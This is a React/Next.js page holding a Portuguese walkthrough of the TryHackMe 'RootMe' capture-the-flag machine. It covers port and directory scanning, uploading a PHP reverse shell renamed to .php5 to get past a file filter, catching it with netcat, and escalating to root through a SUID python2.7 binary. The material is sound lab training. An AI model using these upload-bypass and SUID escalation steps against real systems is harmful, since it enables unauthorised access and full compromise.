
import { Metadata } from "next"

export const metadata: Metadata = {
  title: "Try Hack Me - RootMe | fe1ps",
  description: "Walkthrough da máquina RootMe do TryHackMe, abordando upload de shell reverso e escalação de privilégios via SUID em Python.",
}

// --- Componentes de Estilo ---

const CodeBlock = ({ children }: { children: React.ReactNode }) => (
  <pre className="bg-gray-900/50 p-4 rounded-md overflow-x-auto text-sm text-white/90 font-mono">
    <code>{children}</code>
  </pre>
);

const InlineCode = ({ children }: { children: React.ReactNode }) => (
  <code className="bg-gray-700/50 text-orange-300 py-1 px-1.5 rounded-md text-sm font-mono">
    {children}
  </code>
);

const InfoBlock = ({ children }: { children: React.ReactNode }) => (
    <div className="bg-blue-900/30 border-l-4 border-blue-400 p-4 rounded-md my-4">
        {children}
    </div>
);

const SummaryBlock = ({ children }: { children: React.ReactNode }) => (
    <div className="bg-gray-800/50 border-l-4 border-gray-500 p-4 rounded-md my-4">
        {children}
    </div>
);

const WarningBlock = ({ children }: { children: React.ReactNode }) => (
    <div className="bg-yellow-900/30 border-l-4 border-yellow-400 p-4 rounded-md my-4">
        {children}
    </div>
);

const SuccessBlock = ({ children }: { children: React.ReactNode }) => (
    <div className="bg-green-900/30 border-l-4 border-green-400 p-4 rounded-md my-4">
        {children}
    </div>
);


// --- Componente Principal do Artigo ---

export default function RootMeArticle() {
  return (
    <div className="py-12">
      <div className="container mx-auto px-4">
        <h1 className="text-4xl font-bold pt-4 mt-4 border-t border-white/30">Try Hack Me - RootMe</h1>
        
        <div className="space-y-12">
            
            <InfoBlock>
                <p><strong>Resumo da Máquina</strong></p>
                <p><strong>IP:</strong> <InlineCode>10.10.2.78</InlineCode></p>
                <p><strong>SO:</strong> Ubuntu Linux</p>
                <p><strong>Vetor de Ataque:</strong> Upload de shell reverso PHP, escalação de privilégios via SUID em Python 2.7.</p>
            </InfoBlock>

            <p className="text-gray-400">
                <strong>Tags:</strong> <InlineCode>#ctf</InlineCode> <InlineCode>#walkthrough</InlineCode> <InlineCode>#nmap</InlineCode> <InlineCode>#gobuster</InlineCode> <InlineCode>#reverseshell</InlineCode> <InlineCode>#privesc</InlineCode> <InlineCode>#suid</InlineCode>
            </p>

          <section>
            <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">1. Reconhecimento e Enumeração</h2>
            <p className="mt-4 text-gray-300">
              O primeiro passo foi escanear a máquina alvo para identificar portas abertas e os serviços em execução.
            </p>
            <h3 className="text-xl font-semibold mt-4">1.1. Varredura com Nmap</h3>
            <p className="mt-2 text-gray-300">Usei o Nmap com o script <InlineCode>-sV</InlineCode> para detectar as versões dos serviços.</p>
            <CodeBlock>nmap -sV 10.10.2.78</CodeBlock>
            <p className="mt-2 text-gray-300"><strong>Resultado:</strong></p>
            <CodeBlock>{`Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-04 19:18 -03
Nmap scan report for 10.10.2.78
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`}
            </CodeBlock>
            <SummaryBlock>
                <p><strong>Pontos de Interesse Encontrados:</strong></p>
                <ul className="list-disc list-inside mt-2">
                    <li><strong>Porta 22:</strong> SSH (<InlineCode>OpenSSH 8.2p1</InlineCode>)</li>
                    <li><strong>Porta 80:</strong> HTTP (<InlineCode>Apache httpd 2.4.41</InlineCode>)</li>
                </ul>
            </SummaryBlock>

            <h3 className="text-xl font-semibold mt-4">1.2. Enumeração de Diretórios Web</h3>
            <p className="mt-2 text-gray-300">Com um servidor web ativo, o próximo passo foi procurar por diretórios e arquivos ocultos usando o <strong>GoBuster</strong>.</p>
            <CodeBlock>gobuster dir -u http://10.10.2.78/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</CodeBlock>
            <p className="mt-2 text-gray-300"><strong>Resultado:</strong></p>
            <CodeBlock>{`===============================================================
Gobuster v3.8
===============================================================
[+] Url:                     http://10.10.2.78/
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
/uploads              (Status: 301) [Size: 310] [--> http://10.10.2.78/uploads/]
/css                  (Status: 301) [Size: 306] [--> http://10.10.2.78/css/]
/js                   (Status: 301) [Size: 305] [--> http://10.10.2.78/js/]
/panel                (Status: 301) [Size: 308] [--> http://10.10.2.78/panel/]
===============================================================`}
            </CodeBlock>
            <p className="mt-4 text-gray-300">O diretório <InlineCode>/panel/</InlineCode> parece ser o mais promissor para investigação.</p>
          </section>

          <section>
            <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">2. Acesso Inicial (Shell Reverso)</h2>
            <p className="mt-4 text-gray-300">
              Ao investigar o diretório <InlineCode>/panel/</InlineCode>, encontrei um formulário de upload. A estratégia foi enviar um shell reverso em PHP para ganhar acesso à máquina.
            </p>
            <h3 className="text-xl font-semibold mt-4">2.1. Preparando o Payload</h3>
            <p className="mt-2 text-gray-300">Utilizei o conhecido script <InlineCode>php-reverse-shell</InlineCode> do Pentestmonkey.</p>
            <WarningBlock>
                <strong>Modificação Necessária:</strong> O servidor não executava arquivos com a extensão <InlineCode>.php</InlineCode>. Foi necessário renomear o payload para <strong><InlineCode>shell.php5</InlineCode></strong> para que o upload e a execução funcionassem.
            </WarningBlock>
            <h3 className="text-xl font-semibold mt-4">2.2. Execução</h3>
            <ol className="list-decimal list-inside mt-2 text-gray-300 space-y-2">
                <li>Iniciei um listener na minha máquina local com <InlineCode>netcat</InlineCode> para receber a conexão reversa:
                    <CodeBlock>nc -lvnp 1234</CodeBlock>
                </li>
                <li>Fiz o upload do arquivo <InlineCode>shell.php5</InlineCode> através do formulário e o acessei pelo navegador (provavelmente em <InlineCode>/uploads/shell.php5</InlineCode>).</li>
                <li>O listener recebeu a conexão, concedendo um shell como o usuário <InlineCode>www-data</InlineCode>:
                    <CodeBlock>{`listening on [any] 1234 ...
connect to [10.9.1.139] from (UNKNOWN) [10.10.2.78] 40272
Linux ip-10-10-2-78 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
22:53:43 up 37 min,  0 users,  load average: 0.00, 0.00, 0.00
uid=33(www-data) gid=33(www-data) groups=33(www-data)    /bin/sh: 0: can\'t access tty; job control turned off
}`}`
                    </CodeBlock>
                </li>
            </ol>
            <h3 className="text-xl font-semibold mt-4">2.3. Capturando a Flag do Usuário</h3>
            <p className="mt-2 text-gray-300">Com o acesso inicial, procurei pela flag <InlineCode>user.txt</InlineCode>.</p>
            <CodeBlock>{`$ find / -type f -name "user.txt" 2>/dev/null
/var/www/user.txt
$ cat /var/www/user.txt`}
            </CodeBlock>
            <SuccessBlock>
                <strong>user.txt:</strong> <InlineCode>THM{"THM{...user_flag...}"}</InlineCode>
            </SuccessBlock>
          </section>

          <section>
            <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">3. Escalação de Privilégios</h2>
            <p className="mt-4 text-gray-300">
              O objetivo final é obter acesso root. Para isso, procurei por vetores de escalação de privilégios, começando com binários que possuem a permissão SUID.
            </p>
            <h3 className="text-xl font-semibold mt-4">3.1. Identificando o Vetor</h3>
            <p className="mt-2 text-gray-300">Usei o comando <InlineCode>find</InlineCode> para listar todos os arquivos no sistema com o bit SUID ativado.</p>
            <CodeBlock>$ find / -perm -4000 -type f 2&gt;/dev/null</CodeBlock>
            <p className="mt-2 text-gray-300">Um resultado se destacou:</p>
            <CodeBlock>/usr/bin/python2.7</CodeBlock>
            <p className="mt-4 text-gray-300">O binário <InlineCode>/usr/bin/python2.7</InlineCode> com permissão SUID é um vetor conhecido de escalação de privilégios.</p>
            
            <h3 className="text-xl font-semibold mt-4">3.2. Exploração com GTFOBins</h3>
            <p className="mt-2 text-gray-300">
              O site <a href="https://gtfobins.github.io/gtfobins/python/" target="_blank" rel="noopener noreferrer" className="text-sky-400 hover:underline">GTFOBins</a> possui o comando exato para explorar essa vulnerabilidade e obter um shell com os privilégios do dono do arquivo (neste caso, <InlineCode>root</InlineCode>).
            </p>
            <p className="mt-2 text-gray-300">Executei o seguinte comando no shell <InlineCode>www-data</InlineCode>:</p>
            <CodeBlock>$ /usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'</CodeBlock>
            <p className="mt-4 text-gray-300">O parâmetro <InlineCode>-p</InlineCode> no <InlineCode>sh</InlineCode> garante que o <em>effective user ID</em> seja mantido, resultando em um shell de root.</p>

            <h3 className="text-xl font-semibold mt-4">3.3. Capturando a Flag Root</h3>
            <p className="mt-2 text-gray-300">Agora como <InlineCode>root</InlineCode>, bastou encontrar e ler a flag final.</p>
            <CodeBlock>{`find / -type f -name "root.txt" 2>/dev/null
/root/root.txt
cat /root/root.txt`}
            </CodeBlock>
            <SuccessBlock>
                <strong>root.txt:</strong> <InlineCode>{"THM{...root_flag...}"}</InlineCode>
            </SuccessBlock>
          </section>
        </div>
      </div>
    </div>
  )
}
